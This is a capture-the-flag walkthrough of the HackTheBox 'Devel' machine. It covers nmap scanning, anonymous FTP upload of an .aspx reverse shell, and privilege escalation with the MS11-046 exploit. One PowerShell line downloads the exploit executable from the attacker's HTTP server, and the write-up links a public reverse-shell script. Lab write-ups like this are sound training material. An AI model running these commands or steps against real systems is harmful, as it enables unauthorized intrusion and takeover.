# Devel
<div align="center">
  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/f386dc63-4e14-4568-afd6-faa1720e7732" load="lazy"></img>
</div>


  Welcome back, here we have a very old HacktheBox easy machine, that for this reason is really simple, but let’s start as usual, by running `nmap`

  ```plaintext
  ┌──(kali㉿kali)-[~/diego/Hack_the_box/Machines/Devel]
  └─$ sudo nmap -sS -sC -sV --script=vuln -oN scans/nmap.txt 10.10.10.5
  [sudo] password for kali: 
  Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-22 14:50 EDT
  Nmap scan report for 10.10.10.5
  Host is up (0.056s latency).
  Not shown: 998 filtered tcp ports (no-response)
  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     Microsoft ftpd
  80/tcp open  http    Microsoft IIS httpd 7.5
  |_http-server-header: Microsoft-IIS/7.5
  | vulners: 
  |   cpe:/a:microsoft:internet_information_services:7.5: 
  |       CVE-2010-3972   10.0    https://vulners.com/cve/CVE-2010-3972
  |       SSV:20122       9.3     https://vulners.com/seebug/SSV:20122    *EXPLOIT*
  |       CVE-2010-2730   9.3     https://vulners.com/cve/CVE-2010-2730
  |       SSV:20121       4.3     https://vulners.com/seebug/SSV:20121    *EXPLOIT*
  |_      CVE-2010-1899   4.3     https://vulners.com/cve/CVE-2010-1899
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  |_http-csrf: Couldn't find any CSRF vulnerabilities.
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 253.22 seconds
  ```
  
  As always we have a website that we can visit
  
  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/3d4b9792-8015-4ca5-9c13-6d2f344fbfb3" load="lazy" ></img>
  
  This is the tipical page of Windows IIS, where we have nothing to do, but from nmap we can see that there is the ftp port, and maybe we can login via anonymous
  
  
  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/b0f2e002-12d3-410b-9658-b1274483d886" load="lazy"></img>
  
  
  And we are in! By listing the files we can see that there are all the pages that are visitable from the site, like the `welcome.png` one.
  
 
  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/78de96a2-01ef-4521-af83-ca2d1b8dcde2" load="lazy" ></img>

  
  We can now try to upload custom files like a revshell in php or py.

  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/53edac12-de11-4a8c-b3cd-ddee6c0d2605" load="lazy" ></img>

  
  As you can see neither of them seems not to be readable from the website page, so we can think of an executable extension allowed, and because we are in an `aspnet_client`, maybe we can use the `.aspx` extension.

  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/70801370-8c8c-4c11-acf3-639794f6960e" load="lazy" ></img>
 
  
  It works so now we can upload an `.aspx` reverseshell found [online](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx).
  Now we just need to upload it and visit the page while listening at that port
  

  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/6afc1ae2-b706-44ae-81ae-397738e04e64" load="lazy"></img>
  
  ## Privilege Escalation
  
  In this machine we won’t be able to read the user flag until we will get to admin, because we are not allowd to visit the user page, but by looking at the system informations we can get some interesting infos
  
 
  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/b466cd52-7d35-4242-bbdf-0b08ec794eb8" load="lazy"></img>

  
  As you can see we have a pretty old windows version without any Hot-Fix, and by looking for it online we found an interesting page 

  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/42ac3ed2-d3e5-43c5-a6f7-70a6f0153e8a" load="lazy"></img>

  
  
  We have even the `EDB-ID` that we can use to fetch the exploit from searchsploit
  

  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/0c8e9333-9965-4c43-882a-0217713822c3" load="lazy"></img>

  
  Now we need to compile the code in the given way of the `CVE`
  

  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/a743e510-f373-40aa-9bf3-0302fcf077ec" load="lazy"></img>
  
  
  
  So just compile and trasfer it via python server 
  
  ```c
  powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.204:8000/MS11-046.exe', 'C:\Windows\Temp\MS11-046.exe')"
  ```
  
  And here is the exploit execution

  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/a4eb57ba-388f-4303-a7af-a4f8238df9f6" load="lazy"></img>

  
  
  Now we are system and like this we can fetch all the flags
  
  ```plaintext
  c:\>type \Users\babis\Desktop\user.txt
  type \Users\babis\Desktop\user.txt
  aXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX6
  
  c:\>type \Users\administrator\Desktop\root.txt
  type \Users\administrator\Desktop\root.txt
  6XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX5
  ```
  Just like this we solved the machine

  <img src="https://github.com/Wanasgheo/Writeups/assets/111740362/9adc4f54-8bd3-41dd-bde1-311c173dde88" load="lazy"></img>

</div>
